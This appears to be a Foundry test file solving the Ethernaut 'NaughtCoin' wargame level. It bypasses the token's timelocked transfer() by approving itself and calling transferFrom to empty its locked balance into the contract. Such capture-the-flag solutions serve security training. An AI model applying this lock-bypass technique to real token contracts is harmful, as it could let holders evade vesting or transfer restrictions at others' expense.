// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/15-NaughtCoin/NaughtCoin.sol";

contract ContractTest is Test {
    // NaughtCoin(payable(0x5eF5e08519b9118DC1783D29e7B485aF2FBFB4d6));
    NaughtCoin level15;

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x5eF5e08519b9118DC1783D29e7B485aF2FBFB4d6),
            "Ethernaut15"
        );
        // simulate the contract deployment to mint ourselfs some NaughtCoin
        level15 = new NaughtCoin(address(this));
    }

    function testEthernaut15() public {
        // Verify we have a good start state
        uint256 balance = 1000000 * (10 ** 18);
        assert(level15.balanceOf(address(this)) == balance);
        assert(level15.balanceOf(address(level15)) == 0);

        // We need to transfer our own funds, to follow the transferFrom implementataion we need to have a allowance mapping
        level15.approve(address(this), balance);

        // check the allowance[attacker][attacker]
        console.log(level15.allowance(address(this), address(this)));

        level15.transferFrom(address(this), address(level15), balance);

        // Verify we pass the level
        assert(level15.balanceOf(address(this)) == 0);
        assert(level15.balanceOf(address(level15)) == balance);
    }

    receive() external payable {}
}
